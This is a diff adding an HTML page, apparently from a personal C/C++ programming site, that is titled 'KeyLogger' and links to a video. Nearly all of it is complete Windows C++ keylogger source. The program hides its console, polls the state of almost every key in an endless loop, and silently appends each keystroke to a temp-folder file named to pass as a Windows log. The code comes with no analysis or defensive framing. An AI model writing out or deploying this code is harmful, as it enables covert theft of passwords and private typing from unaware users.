@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="pt_BR>
+<head>
+    <title>Wagner Marcuci Software C/C++</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+</head>
+<body style="background-color:black; color:white;" alink="white" link="white" vlink="white">
+<h2 style="border: 1px solid white;width:150px;padding:5px;">&nbsp;&nbsp;KeyLogger</h2>
+<br/>
+<a href="https://www.youtube.com/watch?v=q43uOt2zNyQ" 
+style="font-family:Candara;text-decoration:none;color:red;">V&iacute;deo do Canal</a>
+</br></br>
+<pre>
+#include &lt;iostream&gt;
+#include &lt;windows.h&gt;
+#include &lt;fstream&gt;
+
+void gravar_log( char * );
+std::ofstream saida_log;
+
+int main()
+{
+    FreeConsole();
+    char buffer[ 256 ];
+
+    ZeroMemory( buffer, 256 );
+
+    if ( GetTempPathA( 255, buffer ) == 0 )
+    {
+        return 1;
+    }
+
+    strncat( buffer, "windowslog.dat", 14 );
+    saida_log.open( buffer, std::ofstream::out | std::ofstream::app  );
+
+    if ( !saida_log.is_open() )
+    {
+        return 1;
+    }
+
+    while( true )
+    {
+        if ( GetAsyncKeyState( VK_LBUTTON ) & 0x00000001 )             saida_log &lt;&lt; "VK_LBUTTON~";
+        if ( GetAsyncKeyState( VK_RBUTTON ) & 0x00000001 )             saida_log &lt;&lt; "VK_RBUTTON~";
+        if ( GetAsyncKeyState( VK_CANCEL ) & 0x00000001 )              saida_log &lt;&lt; "VK_CANCEL~";
+        if ( GetAsyncKeyState( VK_MBUTTON ) & 0x00000001 )             saida_log &lt;&lt; "VK_MBUTTON~";
+        if ( GetAsyncKeyState( VK_XBUTTON1 ) & 0x00000001 )            saida_log &lt;&lt; "VK_XBUTTON1~";
+        if ( GetAsyncKeyState( VK_XBUTTON2 ) & 0x00000001 )            saida_log &lt;&lt; "VK_XBUTTON2~";
+        if ( GetAsyncKeyState( VK_BACK ) & 0x00000001 )                saida_log &lt;&lt; "VK_BACK~";
+        if ( GetAsyncKeyState( VK_TAB ) & 0x00000001 )                 saida_log &lt;&lt; "VK_TAB~";
+        if ( GetAsyncKeyState( VK_CLEAR ) & 0x00000001 )               saida_log &lt;&lt; "VK_CLEAR~";
+        if ( GetAsyncKeyState( VK_RETURN ) & 0x00000001 )              saida_log &lt;&lt; "VK_RETURN~";
+        if ( GetAsyncKeyState( VK_SHIFT ) & 0x00000001 )               saida_log &lt;&lt; "VK_SHIFT~";
+        if ( GetAsyncKeyState( VK_CONTROL ) & 0x00000001 )             saida_log &lt;&lt; "VK_CONTROL~";
+        if ( GetAsyncKeyState( VK_MENU ) & 0x00000001 )                saida_log &lt;&lt; "VK_MENU~";
+        if ( GetAsyncKeyState( VK_PAUSE ) & 0x00000001 )               saida_log &lt;&lt; "VK_PAUSE~";
+        if ( GetAsyncKeyState( VK_CAPITAL ) & 0x00000001 )             saida_log &lt;&lt; "VK_CAPITAL~";
+        if ( GetAsyncKeyState( VK_KANA ) & 0x00000001 )                saida_log &lt;&lt; "VK_KANA~";
+//        if ( GetAsyncKeyState( VK_HANGUEL ) & 0x00000001 )           saida_log &lt;&lt; "VK_HANGUEL~";
+        if ( GetAsyncKeyState( VK_HANGUL ) & 0x00000001 )              saida_log &lt;&lt; "VK_HANGUL~";
+//        if ( GetAsyncKeyState( VK_IME_ON ) & 0x00000001 )            saida_log &lt;&lt; "VK_IME_ON~";
+        if ( GetAsyncKeyState( VK_JUNJA ) & 0x00000001 )               saida_log &lt;&lt; "VK_JUNJA~";
+        if ( GetAsyncKeyState( VK_FINAL ) & 0x00000001 )               saida_log &lt;&lt; "VK_FINAL~";
+        if ( GetAsyncKeyState( VK_HANJA ) & 0x00000001 )               saida_log &lt;&lt; "VK_HANJA~";
+        if ( GetAsyncKeyState( VK_KANJI ) & 0x00000001 )               saida_log &lt;&lt; "VK_KANJI~";
+//        if ( GetAsyncKeyState( VK_IME_OFF ) & 0x00000001 )           saida_log &lt;&lt; "VK_IME_OFF~";
+        if ( GetAsyncKeyState( VK_ESCAPE ) & 0x00000001 )              saida_log &lt;&lt; "VK_ESCAPE~";
+        if ( GetAsyncKeyState( VK_CONVERT ) & 0x00000001 )             saida_log &lt;&lt; "VK_CONVERT~";
+        if ( GetAsyncKeyState( VK_NONCONVERT ) & 0x00000001 )          saida_log &lt;&lt; "VK_NONCONVERT~";
+        if ( GetAsyncKeyState( VK_ACCEPT ) & 0x00000001 )              saida_log &lt;&lt; "VK_ACCEPT~";
+        if ( GetAsyncKeyState( VK_MODECHANGE ) & 0x00000001 )          saida_log &lt;&lt; "VK_MODECHANGE~";
+        if ( GetAsyncKeyState( VK_SPACE ) & 0x00000001 )               saida_log &lt;&lt; "VK_SPACE~";
+        if ( GetAsyncKeyState( VK_PRIOR ) & 0x00000001 )               saida_log &lt;&lt; "VK_PRIOR~";
+        if ( GetAsyncKeyState( VK_NEXT ) & 0x00000001 )                saida_log &lt;&lt; "VK_NEXT~";
+        if ( GetAsyncKeyState( VK_END ) & 0x00000001 )                 saida_log &lt;&lt; "VK_END~";
+        if ( GetAsyncKeyState( VK_HOME ) & 0x00000001 )                saida_log &lt;&lt; "VK_HOME~";
+        if ( GetAsyncKeyState( VK_LEFT ) & 0x00000001 )                saida_log &lt;&lt; "VK_LEFT~";
+        if ( GetAsyncKeyState( VK_UP ) & 0x00000001 )                  saida_log &lt;&lt; "VK_UP~";
+        if ( GetAsyncKeyState( VK_RIGHT ) & 0x00000001 )               saida_log &lt;&lt; "VK_RIGHT~";
+        if ( GetAsyncKeyState( VK_DOWN ) & 0x00000001 )                saida_log &lt;&lt; "VK_DOWN~";
+        if ( GetAsyncKeyState( VK_SELECT ) & 0x00000001 )              saida_log &lt;&lt; "VK_SELECT~";
+        if ( GetAsyncKeyState( VK_PRINT ) & 0x00000001 )               saida_log &lt;&lt; "VK_PRINT~";
+        if ( GetAsyncKeyState( VK_EXECUTE ) & 0x00000001 )             saida_log &lt;&lt; "VK_EXECUTE~";
+        if ( GetAsyncKeyState( VK_SNAPSHOT ) & 0x00000001 )            saida_log &lt;&lt; "VK_SNAPSHOT~";
+        if ( GetAsyncKeyState( VK_INSERT ) & 0x00000001 )              saida_log &lt;&lt; "VK_INSERT~";
+        if ( GetAsyncKeyState( VK_DELETE ) & 0x00000001 )              saida_log &lt;&lt; "VK_DELETE~";
+        if ( GetAsyncKeyState( VK_HELP ) & 0x00000001 )                saida_log &lt;&lt; "VK_HELP~";
+        if ( GetAsyncKeyState( 0x30 ) & 0x00000001 )                   saida_log &lt;&lt; "0~";
+        if ( GetAsyncKeyState( 0x31 ) & 0x00000001 )                   saida_log &lt;&lt; "1~";
+        if ( GetAsyncKeyState( 0x32 ) & 0x00000001 )                   saida_log &lt;&lt; "2~";
+        if ( GetAsyncKeyState( 0x33 ) & 0x00000001 )                   saida_log &lt;&lt; "3~";
+        if ( GetAsyncKeyState( 0x34 ) & 0x00000001 )                   saida_log &lt;&lt; "4~";
+        if ( GetAsyncKeyState( 0x35 ) & 0x00000001 )                   saida_log &lt;&lt; "5~";
+        if ( GetAsyncKeyState( 0x36 ) & 0x00000001 )                   saida_log &lt;&lt; "6~";
+        if ( GetAsyncKeyState( 0x37 ) & 0x00000001 )                   saida_log &lt;&lt; "7~";
+        if ( GetAsyncKeyState( 0x38 ) & 0x00000001 )                   saida_log &lt;&lt; "8~";
+        if ( GetAsyncKeyState( 0x39 ) & 0x00000001 )                   saida_log &lt;&lt; "9~";
+        if ( GetAsyncKeyState( 0x41 ) & 0x00000001 )                   saida_log &lt;&lt; "A~";
+        if ( GetAsyncKeyState( 0x42 ) & 0x00000001 )                   saida_log &lt;&lt; "B~";
+        if ( GetAsyncKeyState( 0x43 ) & 0x00000001 )                   saida_log &lt;&lt; "C~";
+        if ( GetAsyncKeyState( 0x44 ) & 0x00000001 )                   saida_log &lt;&lt; "D~";
+        if ( GetAsyncKeyState( 0x45 ) & 0x00000001 )                   saida_log &lt;&lt; "E~";
+        if ( GetAsyncKeyState( 0x46 ) & 0x00000001 )                   saida_log &lt;&lt; "F~";
+        if ( GetAsyncKeyState( 0x47 ) & 0x00000001 )                   saida_log &lt;&lt; "G~";
+        if ( GetAsyncKeyState( 0x48 ) & 0x00000001 )                   saida_log &lt;&lt; "H~";
+        if ( GetAsyncKeyState( 0x49 ) & 0x00000001 )                   saida_log &lt;&lt; "I~";
+        if ( GetAsyncKeyState( 0x4A ) & 0x00000001 )                   saida_log &lt;&lt; "J~";
+        if ( GetAsyncKeyState( 0x4B ) & 0x00000001 )                   saida_log &lt;&lt; "K~";
+        if ( GetAsyncKeyState( 0x4C ) & 0x00000001 )                   saida_log &lt;&lt; "L~";
+        if ( GetAsyncKeyState( 0x4D ) & 0x00000001 )                   saida_log &lt;&lt; "M~";
+        if ( GetAsyncKeyState( 0x4E ) & 0x00000001 )                   saida_log &lt;&lt; "N~";
+        if ( GetAsyncKeyState( 0x4F ) & 0x00000001 )                   saida_log &lt;&lt; "O~";
+        if ( GetAsyncKeyState( 0x50 ) & 0x00000001 )                   saida_log &lt;&lt; "P~";
+        if ( GetAsyncKeyState( 0x51 ) & 0x00000001 )                   saida_log &lt;&lt; "Q~";
+        if ( GetAsyncKeyState( 0x52 ) & 0x00000001 )                   saida_log &lt;&lt; "R~";
+        if ( GetAsyncKeyState( 0x53 ) & 0x00000001 )                   saida_log &lt;&lt; "S~";
+        if ( GetAsyncKeyState( 0x54 ) & 0x00000001 )                   saida_log &lt;&lt; "T~";
+        if ( GetAsyncKeyState( 0x55 ) & 0x00000001 )                   saida_log &lt;&lt; "U~";
+        if ( GetAsyncKeyState( 0x56 ) & 0x00000001 )                   saida_log &lt;&lt; "V~";
+        if ( GetAsyncKeyState( 0x57 ) & 0x00000001 )                   saida_log &lt;&lt; "W~";
+        if ( GetAsyncKeyState( 0x58 ) & 0x00000001 )                   saida_log &lt;&lt; "X~";
+        if ( GetAsyncKeyState( 0x59 ) & 0x00000001 )                   saida_log &lt;&lt; "Y~";
+        if ( GetAsyncKeyState( 0x5A ) & 0x00000001 )                   saida_log &lt;&lt; "Z~";
+        if ( GetAsyncKeyState( VK_LWIN ) & 0x00000001 )                saida_log &lt;&lt; "VK_LWIN~";
+        if ( GetAsyncKeyState( VK_RWIN ) & 0x00000001 )                saida_log &lt;&lt; "VK_RWIN~";
+        if ( GetAsyncKeyState( VK_APPS ) & 0x00000001 )                saida_log &lt;&lt; "VK_APPS~";
+        if ( GetAsyncKeyState( VK_SLEEP ) & 0x00000001 )               saida_log &lt;&lt; "VK_SLEEP~";
+        if ( GetAsyncKeyState( VK_NUMPAD0 ) & 0x00000001 )             saida_log &lt;&lt; "VK_NUMPAD0~";
+        if ( GetAsyncKeyState( VK_NUMPAD1 ) & 0x00000001 )             saida_log &lt;&lt; "VK_NUMPAD1~";
+        if ( GetAsyncKeyState( VK_NUMPAD2 ) & 0x00000001 )             saida_log &lt;&lt; "VK_NUMPAD2~";
+        if ( GetAsyncKeyState( VK_NUMPAD3 ) & 0x00000001 )             saida_log &lt;&lt; "VK_NUMPAD3~";
+        if ( GetAsyncKeyState( VK_NUMPAD4 ) & 0x00000001 )             saida_log &lt;&lt; "VK_NUMPAD4~";
+        if ( GetAsyncKeyState( VK_NUMPAD5 ) & 0x00000001 )             saida_log &lt;&lt; "VK_NUMPAD5~";
+        if ( GetAsyncKeyState( VK_NUMPAD6 ) & 0x00000001 )             saida_log &lt;&lt; "VK_NUMPAD6~";
+        if ( GetAsyncKeyState( VK_NUMPAD7 ) & 0x00000001 )             saida_log &lt;&lt; "VK_NUMPAD7~";
+        if ( GetAsyncKeyState( VK_NUMPAD8 ) & 0x00000001 )             saida_log &lt;&lt; "VK_NUMPAD8~";
+        if ( GetAsyncKeyState( VK_NUMPAD9 ) & 0x00000001 )             saida_log &lt;&lt; "VK_NUMPAD9~";
+        if ( GetAsyncKeyState( VK_MULTIPLY ) & 0x00000001 )            saida_log &lt;&lt; "VK_MULTIPLY~";
+        if ( GetAsyncKeyState( VK_ADD ) & 0x00000001 )                 saida_log &lt;&lt; "VK_ADD~";
+        if ( GetAsyncKeyState( VK_SEPARATOR ) & 0x00000001 )           saida_log &lt;&lt; "VK_SEPARATOR~";
+        if ( GetAsyncKeyState( VK_SUBTRACT ) & 0x00000001 )            saida_log &lt;&lt; "VK_SUBTRACT~";
+        if ( GetAsyncKeyState( VK_DECIMAL ) & 0x00000001 )             saida_log &lt;&lt; "VK_DECIMAL~";
+        if ( GetAsyncKeyState( VK_DIVIDE ) & 0x00000001 )              saida_log &lt;&lt; "VK_DIVIDE~";
+        if ( GetAsyncKeyState( VK_F1 ) & 0x00000001 )                  saida_log &lt;&lt; "VK_F1~";
+        if ( GetAsyncKeyState( VK_F2 ) & 0x00000001 )                  saida_log &lt;&lt; "VK_F2~";
+        if ( GetAsyncKeyState( VK_F3 ) & 0x00000001 )                  saida_log &lt;&lt; "VK_F3~";
+        if ( GetAsyncKeyState( VK_F4 ) & 0x00000001 )                  saida_log &lt;&lt; "VK_F4~";
+        if ( GetAsyncKeyState( VK_F5 ) & 0x00000001 )                  saida_log &lt;&lt; "VK_F5~";
+        if ( GetAsyncKeyState( VK_F6 ) & 0x00000001 )                  saida_log &lt;&lt; "VK_F6~";
+        if ( GetAsyncKeyState( VK_F7 ) & 0x00000001 )                  saida_log &lt;&lt; "VK_F7~";
+        if ( GetAsyncKeyState( VK_F8 ) & 0x00000001 )                  saida_log &lt;&lt; "VK_F8~";
+        if ( GetAsyncKeyState( VK_F9 ) & 0x00000001 )                  saida_log &lt;&lt; "VK_F9~";
+        if ( GetAsyncKeyState( VK_F10 ) & 0x00000001 )                 saida_log &lt;&lt; "VK_F10~";
+        if ( GetAsyncKeyState( VK_F11 ) & 0x00000001 )                 saida_log &lt;&lt; "VK_F11~";
+        if ( GetAsyncKeyState( VK_F12 ) & 0x00000001 )                 saida_log &lt;&lt; "VK_F12~";
+        if ( GetAsyncKeyState( VK_F13 ) & 0x00000001 )                 saida_log &lt;&lt; "VK_F13~";
+        if ( GetAsyncKeyState( VK_F14 ) & 0x00000001 )                 saida_log &lt;&lt; "VK_F14~";
+        if ( GetAsyncKeyState( VK_F15 ) & 0x00000001 )                 saida_log &lt;&lt; "VK_F15~";
+        if ( GetAsyncKeyState( VK_F16 ) & 0x00000001 )                 saida_log &lt;&lt; "VK_F16~";
+        if ( GetAsyncKeyState( VK_F17 ) & 0x00000001 )                 saida_log &lt;&lt; "VK_F17~";
+        if ( GetAsyncKeyState( VK_F18 ) & 0x00000001 )                 saida_log &lt;&lt; "VK_F18~";
+        if ( GetAsyncKeyState( VK_F19 ) & 0x00000001 )                 saida_log &lt;&lt; "VK_F19~";
+        if ( GetAsyncKeyState( VK_F20 ) & 0x00000001 )                 saida_log &lt;&lt; "VK_F20~";
+        if ( GetAsyncKeyState( VK_F21 ) & 0x00000001 )                 saida_log &lt;&lt; "VK_F21~";
+        if ( GetAsyncKeyState( VK_F22 ) & 0x00000001 )                 saida_log &lt;&lt; "VK_F22~";
+        if ( GetAsyncKeyState( VK_F23 ) & 0x00000001 )                 saida_log &lt;&lt; "VK_F23~";
+        if ( GetAsyncKeyState( VK_F24 ) & 0x00000001 )                 saida_log &lt;&lt; "VK_F24~";
+        if ( GetAsyncKeyState( VK_NUMLOCK ) & 0x00000001 )             saida_log &lt;&lt; "VK_NUMLOCK~";
+        if ( GetAsyncKeyState( VK_SCROLL ) & 0x00000001 )              saida_log &lt;&lt; "VK_SCROLL~";
+        if ( GetAsyncKeyState( VK_LSHIFT ) & 0x00000001 )              saida_log &lt;&lt; "VK_LSHIFT~";
+        if ( GetAsyncKeyState( VK_RSHIFT ) & 0x00000001 )              saida_log &lt;&lt; "VK_RSHIFT~";
+        if ( GetAsyncKeyState( VK_LCONTROL ) & 0x00000001 )            saida_log &lt;&lt; "VK_LCONTROL~";
+        if ( GetAsyncKeyState( VK_RCONTROL ) & 0x00000001 )            saida_log &lt;&lt; "VK_RCONTROL~";
+        if ( GetAsyncKeyState( VK_LMENU ) & 0x00000001 )               saida_log &lt;&lt; "VK_LMENU~";
+        if ( GetAsyncKeyState( VK_RMENU ) & 0x00000001 )               saida_log &lt;&lt; "VK_RMENU~";
+        if ( GetAsyncKeyState( VK_BROWSER_BACK ) & 0x00000001 )        saida_log &lt;&lt; "VK_BROWSER_BACK~";
+        if ( GetAsyncKeyState( VK_BROWSER_FORWARD ) & 0x00000001 )     saida_log &lt;&lt; "VK_BROWSER_FORWARD~";
+        if ( GetAsyncKeyState( VK_BROWSER_REFRESH ) & 0x00000001 )     saida_log &lt;&lt; "VK_BROWSER_REFRESH~";
+        if ( GetAsyncKeyState( VK_BROWSER_STOP ) & 0x00000001 )        saida_log &lt;&lt; "VK_BROWSER_STOP~";
+        if ( GetAsyncKeyState( VK_BROWSER_SEARCH ) & 0x00000001 )      saida_log &lt;&lt; "VK_BROWSER_SEARCH~";
+        if ( GetAsyncKeyState( VK_BROWSER_FAVORITES ) & 0x00000001 )   saida_log &lt;&lt; "VK_BROWSER_FAVORITES~";
+        if ( GetAsyncKeyState( VK_BROWSER_HOME ) & 0x00000001 )        saida_log &lt;&lt; "VK_BROWSER_HOME~";
+        if ( GetAsyncKeyState( VK_VOLUME_MUTE ) & 0x00000001 )         saida_log &lt;&lt; "VK_VOLUME_MUTE~";
+        if ( GetAsyncKeyState( VK_VOLUME_DOWN ) & 0x00000001 )         saida_log &lt;&lt; "VK_VOLUME_DOWN~";
+        if ( GetAsyncKeyState( VK_VOLUME_UP ) & 0x00000001 )           saida_log &lt;&lt; "VK_VOLUME_UP~";
+        if ( GetAsyncKeyState( VK_MEDIA_NEXT_TRACK ) & 0x00000001 )    saida_log &lt;&lt; "VK_MEDIA_NEXT_TRACK~";
+        if ( GetAsyncKeyState( VK_MEDIA_PREV_TRACK ) & 0x00000001 )    saida_log &lt;&lt; "VK_MEDIA_PREV_TRACK~";
+        if ( GetAsyncKeyState( VK_MEDIA_STOP ) & 0x00000001 )          saida_log &lt;&lt; "VK_MEDIA_STOP~";
+        if ( GetAsyncKeyState( VK_MEDIA_PLAY_PAUSE ) & 0x00000001 )    saida_log &lt;&lt; "VK_MEDIA_PLAY_PAUSE~";
+        if ( GetAsyncKeyState( VK_LAUNCH_MAIL ) & 0x00000001 )         saida_log &lt;&lt; "VK_LAUNCH_MAIL~";
+        if ( GetAsyncKeyState( VK_LAUNCH_MEDIA_SELECT ) & 0x00000001 ) saida_log &lt;&lt; "VK_LAUNCH_MEDIA_SELECT~";
+        if ( GetAsyncKeyState( VK_LAUNCH_APP1 ) & 0x00000001 )         saida_log &lt;&lt; "VK_LAUNCH_APP1~";
+        if ( GetAsyncKeyState( VK_LAUNCH_APP2 ) & 0x00000001 )         saida_log &lt;&lt; "VK_LAUNCH_APP2~";
+        if ( GetAsyncKeyState( VK_OEM_1 ) & 0x00000001 )               saida_log &lt;&lt; "VK_OEM_1~";
+        if ( GetAsyncKeyState( VK_OEM_PLUS ) & 0x00000001 )            saida_log &lt;&lt; "VK_OEM_PLUS~";
+        if ( GetAsyncKeyState( VK_OEM_COMMA ) & 0x00000001 )           saida_log &lt;&lt; "VK_OEM_COMMA~";
+        if ( GetAsyncKeyState( VK_OEM_MINUS ) & 0x00000001 )           saida_log &lt;&lt; "VK_OEM_MINUS~";
+        if ( GetAsyncKeyState( VK_OEM_PERIOD ) & 0x00000001 )          saida_log &lt;&lt; "VK_OEM_PERIOD~";
+        if ( GetAsyncKeyState( VK_OEM_2 ) & 0x00000001 )               saida_log &lt;&lt; "VK_OEM_2~";
+        if ( GetAsyncKeyState( VK_OEM_3 ) & 0x00000001 )               saida_log &lt;&lt; "VK_OEM_3~";
+        if ( GetAsyncKeyState( VK_OEM_4 ) & 0x00000001 )               saida_log &lt;&lt; "VK_OEM_4~";
+        if ( GetAsyncKeyState( VK_OEM_5 ) & 0x00000001 )               saida_log &lt;&lt; "VK_OEM_5~";
+        if ( GetAsyncKeyState( VK_OEM_6 ) & 0x00000001 )               saida_log &lt;&lt; "VK_OEM_6~";
+        if ( GetAsyncKeyState( VK_OEM_7 ) & 0x00000001 )               saida_log &lt;&lt; "VK_OEM_7~";
+        if ( GetAsyncKeyState( VK_OEM_8 ) & 0x00000001 )               saida_log &lt;&lt; "VK_OEM_8~";
+        if ( GetAsyncKeyState( VK_OEM_102 ) & 0x00000001 )             saida_log &lt;&lt; "VK_OEM_102~";
+        if ( GetAsyncKeyState( VK_PROCESSKEY ) & 0x00000001 )          saida_log &lt;&lt; "VK_PROCESSKEY~";
+        if ( GetAsyncKeyState( VK_PACKET ) & 0x00000001 )              saida_log &lt;&lt; "VK_PACKET~";
+        if ( GetAsyncKeyState( VK_ATTN ) & 0x00000001 )                saida_log &lt;&lt; "VK_ATTN~";
+        if ( GetAsyncKeyState( VK_CRSEL ) & 0x00000001 )               saida_log &lt;&lt; "VK_CRSEL~";
+        if ( GetAsyncKeyState( VK_EXSEL ) & 0x00000001 )               saida_log &lt;&lt; "VK_EXSEL~";
+        if ( GetAsyncKeyState( VK_EREOF ) & 0x00000001 )               saida_log &lt;&lt; "VK_EREOF~";
+        if ( GetAsyncKeyState( VK_PLAY ) & 0x00000001 )                saida_log &lt;&lt; "VK_PLAY~";
+        if ( GetAsyncKeyState( VK_ZOOM ) & 0x00000001 )                saida_log &lt;&lt; "VK_ZOOM~";
+        if ( GetAsyncKeyState( VK_NONAME ) & 0x00000001 )              saida_log &lt;&lt; "VK_NONAME~";
+        if ( GetAsyncKeyState( VK_PA1 ) & 0x00000001 )                 saida_log &lt;&lt; "VK_PA1~";
+        if ( GetAsyncKeyState( VK_OEM_CLEAR ) & 0x00000001 )           saida_log &lt;&lt; "VK_OEM_CLEAR~";
+
+        Sleep( 10 );
+        saida_log.flush();
+    }
+    return 0;
+}
+
+</pre>
+</body>
+</html>
